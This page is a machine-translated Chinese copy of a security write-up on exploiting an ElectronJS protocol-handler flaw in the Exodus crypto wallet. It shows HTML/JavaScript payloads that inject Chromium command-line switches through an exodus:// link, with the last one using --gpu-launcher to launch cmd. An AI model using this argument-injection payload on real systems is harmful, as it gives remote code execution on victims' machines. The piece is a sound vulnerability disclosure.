<html>
<head>
<title>Exploiting Electron RCE in Exodus wallet</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">在《出埃及记》钱包中开发电子RCE</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/exploiting-electron-rce-in-exodus-wallet-d9e6db13c374?source=collection_archive---------14-----------------------#2018-01-25">https://medium.com/hackernoon/exploiting-electron-rce-in-exodus-wallet-d9e6db13c374?source=collection_archive---------14-----------------------#2018-01-25</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><p id="f59b" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">在浏览Twitter时，我注意到协议处理程序中的<a class="ae jp" href="https://electronjs.org/blog/protocol-handler-fix" rel="noopener ugc nofollow" target="_blank"> ElectronJS远程代码执行漏洞</a>。听起来很严重。正如官方描述中所述，应用程序易受攻击足以将其自身注册为某个协议的默认处理程序。不久前，我在笔记本电脑上安装了一个基于电子的应用程序，名为<a class="ae jp" href="https://www.exodus.io/" rel="noopener ugc nofollow" target="_blank"> Exodus </a>加密货币钱包。我知道它把自己注册为<em class="jq">出埃及记:// </em> URI计划的处理者。</p><p id="926c" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">由于官方博客上没有关于漏洞的细节，我直接去了electron <a class="ae jp" href="https://github.com/electron/electron" rel="noopener ugc nofollow" target="_blank"> Github </a>寻找最近的提交。接下来的<a class="ae jp" href="https://github.com/electron/electron/commit/c49cb29ddf3368daf279bd60c007f9c015bc834c" rel="noopener ugc nofollow" target="_blank">提交</a>是对漏洞的修复。最大的变化是一个新创建的文件<em class="jq"> command_line_args.cc </em>，它实现了对命令行参数的少量检查。</p><div class="jr js fm fo jt ju"><a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/command_line_args.cc" rel="noopener  ugc nofollow" target="_blank"><div class="jv ab ej"><div class="jw ab jx cl cj jy"><h2 class="bd hv fv z el jz eo ep ka er et ht dt translated">电子/电子</h2><div class="kb l"><h3 class="bd b fv z el jz eo ep ka er et ek translated">用JavaScript、HTML和CSS构建跨平台桌面应用</h3></div><div class="kc l"><p class="bd b gc z el jz eo ep ka er et ek translated">github.com</p></div></div><div class="kd l"><div class="ke l kf kg kh kd ki kj ju"/></div></div></a></div><p id="686d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">基本上，代码根据黑名单检查命令行参数。基于此，可以假设可以通过URI处理程序<strong class="it hv">注入命令行参数。</strong>基于电子的应用程序基本上是一堆Javascript和HTML文件，前端由Chromium呈现，后端由nodejs呈现。Chromium和nodejs被捆绑在主可执行文件中。fix commit中的黑名单字符串是Chromium和nodejs的命令行开关。似乎要利用漏洞，我们只需要在Chromium或nodejs中找到命令行选项，就可以产生额外的进程。</p><p id="8d0a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">为了测试是否真的可以通过协议I向Exodus.exe注入参数，我创建了HTML文件:</p><pre class="kk kl km kn fq ko kp kq kr aw ks dt"><span id="e8fb" class="kt ku hu kp b fv kv kw l kx ky">&lt;!doctype html&gt;<br/>&lt;script&gt;<br/>  window.location = 'exodus://aaaaaaaaa --aaaaa='<br/>&lt;/script&gt;</span></pre><p id="6cbb" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">《出埃及记》钱包推出时有以下论点。</p><figure class="kk kl km kn fq la fe ff paragraph-image"><div class="fe ff kz"><img src="../Images/e08afdcfce12ed0034c7db7a0cb5a4a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1132/format:webp/1*hHEVvAQpHDfnMYztwcSG8A.png"/></div></figure><p id="2506" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">有效负载用双引号括起来。然而，双引号在作为命令行参数传递之前并没有被过滤掉或清理掉。下面允许注入额外的命令行开关。</p><pre class="kk kl km kn fq ko kp kq kr aw ks dt"><span id="4f04" class="kt ku hu kp b fv kv kw l kx ky">&lt;!doctype html&gt;<br/>&lt;script&gt;<br/>  window.location = 'exodus://aaaaaaaaa" --aaaaa=bbbb'<br/>&lt;/script&gt;</span></pre><figure class="kk kl km kn fq la fe ff paragraph-image"><div class="fe ff lc"><img src="../Images/3306f39e3e7a90810e4d424b581ebcdd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/1*4Wscx_MYasAVLIy6BP8Jug.png"/></div></figure><p id="cf2c" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">对于远程代码执行，需要找到一个好的Chromium命令行开关来执行额外的命令。我发现第<a class="ae jp" href="https://peter.sh/experiments/chromium-command-line-switches/" rel="noopener ugc nofollow" target="_blank">页</a>包含了Chromium命令行开关的列表。gpu-launcher 看起来很有前途。</p><blockquote class="ld le lf"><p id="7c32" class="ir is jq it b iu iv iw ix iy iz ja jb lg jd je jf lh jh ji jj li jl jm jn jo hn dt translated">—用于启动gpu进程的gpu-launcher额外命令行选项(通常用于调试)。使用like renderer-cmd-prefix。</p></blockquote><p id="248d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">是时候试试了。</p><pre class="kk kl km kn fq ko kp kq kr aw ks dt"><span id="e766" class="kt ku hu kp b fv kv kw l kx ky">&lt;!doctype html&gt;<br/>&lt;script&gt;<br/>  window.location = 'exodus://aaaaaaaaa" --gpu-launcher="cmd" --aaaaa='<br/>&lt;/script&gt;</span></pre><figure class="kk kl km kn fq la fe ff paragraph-image"><div role="button" tabindex="0" class="lk ll di lm bf ln"><div class="fe ff lj"><img src="../Images/3644455970b4340c20266edb90ab3238.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*_NysdNRGficVDHykofA33Q.gif"/></div></div></figure><p id="e8bf" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">Exodus wallet很快发布了一个更新，它是在漏洞宣布后不久发布的。此外，它通过显示消息为最终用户推送更新做得很好，然而更新不是自动的，用户仍然必须确认更新。无论如何，有很多基于电子的桌面应用程序，所以最好检查一下你的机器上是否有基于电子的应用程序，并确保它已经打了补丁。</p></div></div>    
</body>
</html>